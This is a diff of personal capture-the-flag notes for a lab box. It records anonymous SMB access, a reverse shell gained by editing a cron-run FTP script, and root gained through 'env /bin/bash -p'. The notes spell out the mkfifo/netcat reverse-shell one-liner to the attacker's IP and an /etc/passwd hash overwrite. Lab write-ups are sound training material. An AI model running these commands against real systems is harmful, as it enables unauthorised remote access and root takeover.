@@ -1,4 +1,4 @@
-export IP=10.10.52.71
+export IP=10.10.218.214
 
 
 ==================================================
@@ -28,7 +28,12 @@ export IP=10.10.52.71
 
 6) root.txt
 
-	Answer: ``
+	Answer: `4d930091c31a622a7ed10f27999af363`
+	Command: `env /bin/bash -p`
+	Notes:
+		- Using the reverse shell, I used wget to install linpeas.sh.
+		- Found an exploit with /usr/bin/env.
+		- Found a command in GTFOBins to use the 'env' command to break me into a root shell.
 
 
 ==================================================
@@ -37,6 +42,13 @@ export IP=10.10.52.71
 
 SMB username = ANONYMOUS
 SMB password = namelessone
+
+Reverse Shell Using FTP:
+	1) [my machine]: `nc -lnvp 2222`
+	2) [victim using clean.sh]: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.8.203 2222 >/tmp/f`
+
+Gain Root Access:
+	`env /bin/bash -p`
 
 
 ==================================================
@@ -67,13 +79,26 @@ SMB password = namelessone
 		2) `smbget -R //$IP/pics`
 			> Downloaded everything from the pics folder. Don't think anything was there. Just photos of dogs.
 
-4) Revisting FTP.
+4) Revisting FTP. Gain reverse shell.
 
 	Commands:
-		1) [my machine]: `nc -lnvp 9999`
-		2) [victim using clean.sh]
+		1) [my machine]: `nc -lnvp 2222`
+		2) [victim using clean.sh]: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.8.203 2222 >/tmp/f`
 	Notes:
 		- Noticed that the 'clean_up.sh' script gets called regularly based off what I can see inside the 'removed_files.log'.
 		- Going to try to start a reverse shell using this knowledge.
 		- Was having trouble getting a reverse shell using the 'clean.sh' script. Instead I went ahead and just copied '/etc/passwd' and '/home/namelessone' into the '/var/ftp/scripts' folder which allowed me to save them locally to my folder.
-		# TODO: root the box
+		- Using 'clean.sh', I was able to get my reverse shell working!
+
+5) A litte fun...
+	
+	Commands:
+		1) [locally]: `python3` + `import crypt` + `crypt.crypt('password')`
+			> Printed out the hashed password.
+		2) [victim]: `nano /etc/passwd`
+			> Locate 'namelessone' and replace the first x with hashed password.
+		3) [victim]: `sudo -i` + `password`
+			> You now have a root shell.
+	Notes:
+		- Once root, I decided to try changing namelessone's password and did so by running the above commands and steps.
+		- With that, I was able to SSH into the box.
